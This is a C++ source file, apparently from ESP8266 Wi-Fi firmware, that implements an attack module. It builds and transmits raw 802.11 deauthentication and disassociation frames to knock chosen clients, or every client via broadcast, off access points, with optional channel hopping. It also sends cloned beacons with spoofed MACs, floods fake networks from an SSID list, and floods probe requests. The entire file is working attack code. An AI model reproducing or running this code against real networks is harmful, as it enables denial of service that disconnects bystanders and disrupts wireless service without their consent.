#include "Attack.h"

Attack::Attack(){
  randomSeed(os_random());
}

void Attack::generate(){
  if(debug) Serial.print("\n generating Macs...");
  
  Mac _randomBeaconMac;
  uint8_t _randomMacBuffer[6];
  beaconAdrs._clear();

  for(int i=0;i<macListLen;i++) channels[i] = random(1,12);
  do{
    getRandomVendorMac(_randomMacBuffer);
    for(int i=0;i<6;i++) _randomBeaconMac.setAt(_randomMacBuffer[i],i);
  }while(beaconAdrs.add(_randomBeaconMac) >= 0);
  if(debug) Serial.println("done");
}

void Attack::buildDeauth(Mac _ap, Mac _client, uint8_t type, uint8_t reason){
  packetSize = 0;
  for(int i=0;i<sizeof(deauthPacket);i++){
    packet[i] = deauthPacket[i];
    packetSize++;
  }

  for(int i=0;i<6;i++){
    //set target (client)
    packet[4+i] = _client._get(i);
    //set source (AP)
    packet[10+i] = packet[16+i] = _ap._get(i);
  }

  //set type
  packet[0] = type;
  packet[24] = reason;
}

void Attack::buildBeacon(Mac _ap, String _ssid, int _ch, bool encrypt){
  packetSize = 0;
  int ssidLen = _ssid.length();
  if(ssidLen>32) ssidLen = 32;

  for(int i=0;i<sizeof(beaconPacket_header);i++){
    packet[i] = beaconPacket_header[i];
    packetSize++;
  }

  for(int i=0;i<6;i++){
    //set source (AP)
    packet[10+i] = packet[16+i] = _ap._get(i);
  }
  
  packet[packetSize] = 0x00;
  packetSize++;
  packet[packetSize] = ssidLen;
  packetSize++;
  
  for(int i=0;i<ssidLen;i++){
    packet[packetSize] = _ssid[i];
    packetSize++;
  }

  for(int i=0;i<sizeof(beaconPacket_end);i++){
    packet[packetSize] = beaconPacket_end[i];
    packetSize++;
  }
  
  packet[packetSize] = _ch;
  packetSize++;

  if(encrypt){
    for(int i=0;i<sizeof(beaconWPA2tag);i++){
      packet[packetSize] = beaconWPA2tag[i];
      packetSize++;  
    }
  }
  
}

void Attack::buildProbe(String _ssid, Mac _mac){
  int len = _ssid.length();
  if(len > 32) len = 32;
  packetSize = 0;

  for(int i=0;i<sizeof(probePacket);i++) packet[packetSize+i] = probePacket[i];
  packetSize += sizeof(probePacket);

  for(int i=0;i<6;i++) packet[10+i] = _mac._get(i);

  packet[packetSize] = len;
  packetSize++;
  
  for(int i=0;i<len;i++) packet[packetSize+i] = _ssid[i];
  packetSize += len;
  
}

bool Attack::send(){
  if(wifi_send_pkt_freedom(packet, packetSize, 0) == -1){
    /*
    if(debug){
      Serial.print(packetSize);
      Serial.print(" : ");
      PrintHex8(packet, packetSize);
      Serial.println("");
    }
    */
    return false;
  }
  delay(1); //less packets are beeing dropped
  return true;
}

void Attack::run(){
  unsigned long currentMillis = millis();
  
  /* =============== Deauth Attack =============== */
  if(isRunning[0] && currentMillis-prevTime[0] >= 1000){
    if(debug) Serial.print("running "+(String)attackNames[0]+" attack...");
    prevTime[0] = millis();
    
    for(int a=0;a<apScan.results;a++){
      if(apScan.isSelected(a)){
        Mac _ap;
        int _ch = apScan.getAPChannel(a);
        _ap.setMac(apScan.aps._get(a));

        wifi_set_channel(_ch);

        int _selectedClients = 0;
        for(int i=0;i<clientScan.results;i++){
          if(clientScan.getClientSelected(i)){
            _selectedClients++;

            if(settings.channelHop){
              for(int j=1;j<12;j++){
                wifi_set_channel(j);
                
                buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, settings.deauthReason );
                if(send()) packetsCounter[0]++;
                
                buildDeauth(_ap, clientScan.getClientMac(i), 0xa0, settings.deauthReason );
                if(send()) packetsCounter[0]++;
              }
            }else{
              buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, settings.deauthReason );
              for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
              
              buildDeauth(_ap, clientScan.getClientMac(i), 0xa0, settings.deauthReason );
              for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
            }
          }
        }
        
        if(_selectedClients == 0){
          Mac _client;
          _client.set(0xFF,0xFF,0xFF,0xFF,0xFF,0xFF);

          if(settings.channelHop){
              for(int j=1;j<12;j++){
                wifi_set_channel(j);

                buildDeauth(_ap, _client, 0xc0, settings.deauthReason );
                if(send()) packetsCounter[0]++;
                
                buildDeauth(_ap, _client, 0xa0, settings.deauthReason );
                if(send()) packetsCounter[0]++;
              }
            }else{
              buildDeauth(_ap, _client, 0xc0, settings.deauthReason );
              for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
              
              buildDeauth(_ap, _client, 0xa0, settings.deauthReason );
              for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
            }
        }
        
      } 
    }

    stati[0] = (String)packetsCounter[0]+"pkts/s";
    packetsCounter[0] = 0;
    if(debug) Serial.println(" done");
    if(settings.attackTimeout > 0){
      attackTimeoutCounter[0]++;
      if(attackTimeoutCounter[0] > settings.attackTimeout) stop(1);
    }
  }

  /* =============== Beacon clone Attack =============== */
  if(isRunning[1] && currentMillis-prevTime[1] >= 100){
    if(debug) Serial.print("running "+(String)attackNames[1]+" attack...");
    prevTime[1] = millis();
    
    for(int a=0;a<apScan.results;a++){
      if(apScan.isSelected(a) && !apScan.isHidden(a)){
        String _ssid = apScan.getAPName(a);
        int _ssidLen = _ssid.length();
        int _restSSIDLen = 32 - _ssidLen;
        //int _ch = apScan.getAPChannel(a);

        //wifi_set_channel(_ch);

        for(int c=0;c<macListLen/apScan.selectedSum;c++){
          String _apName = _ssid;
          int _ch = channels[c];
              
          if(c < _restSSIDLen) for(int d=0; d < _restSSIDLen-c; d++) _apName += " ";//e.g. "SAMPLEAP   "
          else if(c < _restSSIDLen*2){
            _apName = " "+_apName;
            for(int d=0;d<(_restSSIDLen-1)-c/2;d++) _apName += " ";//e.g. " SAMPLEAP   "
          }else if(c < _restSSIDLen*3){
            _apName = "."+_apName;
            for(int d=0;d<(_restSSIDLen-1)-c/3;d++) _apName += " ";//e.g. ".SAMPLEAP   "
          } else{
            for(int d=0; d < _restSSIDLen-2; d++) _apName += " ";
            _apName += (String)c;//e.g. "SAMPLEAP        78"
          }

          buildBeacon(beaconAdrs._get(c),_apName,_ch,apScan.getAPEncryption(a) != "none");

          if(send()) packetsCounter[1]++;
        }
        
      }
    }
    
    stati[1] = (String)(packetsCounter[1]*10)+"pkts/s";
    packetsCounter[1] = 0;
    macListChangeCounter++;
    if(macListChangeCounter/10 >= macChangeInterval && macChangeInterval > 0){
      generate();
      macListChangeCounter = 0;
    }
    if(debug) Serial.println(" done");
    if(settings.attackTimeout > 0){
      attackTimeoutCounter[1]++;
      if(attackTimeoutCounter[1]/10 > settings.attackTimeout) stop(1);
    }
  }

  /* =============== Beacon list Attack =============== */
  if(isRunning[2] && currentMillis-prevTime[2] >= 100){
    if(debug) Serial.print("running "+(String)attackNames[2]+" attack...");
    prevTime[2] = millis();
    
    for(int a=0;a<ssidList.len;a++){
      String _ssid = ssidList.get(a);
      int _ch = channels[a];

      buildBeacon(beaconAdrs._get(a),_ssid,_ch,settings.attackEncrypted);

      if(send()) packetsCounter[2]++;
    }
    
    stati[2] = (String)(packetsCounter[2]*10)+"pkts/s";
    packetsCounter[2] = 0;
    macListChangeCounter++;
    if(macListChangeCounter/10 >= macChangeInterval && macChangeInterval > 0){
      generate();
      macListChangeCounter = 0;
    }
    if(debug) Serial.println(" done");
    if(settings.attackTimeout > 0){
      attackTimeoutCounter[2]++;
      if(attackTimeoutCounter[2]/10 > settings.attackTimeout) stop(2);
    }
  }

  /* =============== Probe Request Attack =============== */
  if(isRunning[3] && currentMillis-prevTime[3] >= 1000){
    if(debug) Serial.print("running "+(String)attackNames[3]+" attack...");
    prevTime[3] = millis();
    
    for(int a=0;a<ssidList.len;a++){
      buildProbe(ssidList.get(a), beaconAdrs._get(a));
      if(send()) packetsCounter[3]++;
    }
    
    stati[3] = (String)(packetsCounter[3]*10)+"pkts/s";
    packetsCounter[3] = 0;
    macListChangeCounter++;
    if(macListChangeCounter >= macChangeInterval && macChangeInterval > 0){
      generate();
      macListChangeCounter = 0;
    }
    if(debug) Serial.println("done");
    if(settings.attackTimeout > 0){
      attackTimeoutCounter[3]++;
      if(attackTimeoutCounter[3] > settings.attackTimeout) stop(3);
    }
  }
  
}

void Attack::start(int num){
  Serial.println(num);
  if(!isRunning[num]){
    Serial.println(num);
    isRunning[num] = true;
    stati[num] = "starting";
    prevTime[num] = millis();
    attackTimeoutCounter[num] = 0;
    refreshLed();
    if(debug) Serial.println("starting "+(String)attackNames[num]+" attack...");
    if(num == 1){
      stop(2);
      stop(3);
    } else if(num == 2){
      stop(1);
      stop(3);
    } else if(num == 3){
      stop(1);
      stop(2);
    }
  }else stop(num);
}

void Attack::stop(int num){
  if(isRunning[num]){
    if(debug) Serial.println("stopping "+(String)attackNames[num]+" attack...");
    isRunning[num] = false;
    stati[num] = "ready";
    prevTime[num] = millis();
    refreshLed();
  } 
}

void Attack::stopAll(){
  for(int i=0;i<attacksNum;i++) stop(i);
}

String Attack::getResults(){
  if(debug) Serial.print("getting attacks JSON...");

  for(int i=0;i<attacksNum;i++) if(!isRunning[i]) stati[i] = "ready";
    
  if(apScan.getFirstTarget() < 0) stati[0] = stati[1] = "no AP";
  if(ssidList.len < 1) stati[2] = stati[3] = "no SSID";

  int _selected;
  String json = "{ \"aps\": [";

  _selected = 0;
  for(int i=0;i<apScan.results;i++){
    if(apScan.isSelected(i)){
      json += "\""+apScan.getAPName(i)+"\",";
      _selected++;
    }
  }
  if(_selected > 0) json.remove(json.length()-1);

  json += "], \"clients\": [";
  
  _selected = 0;
  for(int i=0;i<clientScan.results;i++){
    if(clientScan.getClientSelected(i)){
      json += "\""+clientScan.getClientMac(i).toString()+" "+clientScan.getClientVendor(i)+" - "+clientScan.getClientName(i)+"\",";
      _selected++;
    }
  }
  if(_selected == 0) json += "\"FF:FF:FF:FF:FF:FF - BROADCAST\"";
  else json.remove(json.length()-1);
  
  json += "], \"attacks\": [";
  for(int i=0;i<attacksNum;i++){
    json += "{";
    json += "\"name\": \""+attackNames[i]+"\",";
    json += "\"status\": \""+stati[i]+"\",";
    json += "\"running\": "+(String)isRunning[i]+"";
    json += "}";
    if(i != attacksNum-1) json += ",";
  }
  json += "],";
  
  json += "\"ssid\": [";
  for(int i=0;i<ssidList.len;i++){
    json += "\""+ssidList.get(i)+"\"";
    if(i != ssidList.len-1) json += ",";
  }
  json += "]";
  json += "}";
  if(debug){
    Serial.println(json);
    Serial.println("done");
  }
  return json;
}

void Attack::refreshLed(){
   int numberRunning = 0;
   for(int i=0; i<sizeof(isRunning); i++){
    if(isRunning[i]) numberRunning++;
    //if(debug) Serial.println(numberRunning);
   }
  if(numberRunning>=1 && settings.useLed){
    if(debug) Serial.println("Attack LED : ON");
    digitalWrite(2, LOW);
  }
  else if(numberRunning==0 || !settings.useLed){
    if(debug) Serial.println("Attack LED : OFF");
    digitalWrite(2, HIGH);
  }
}

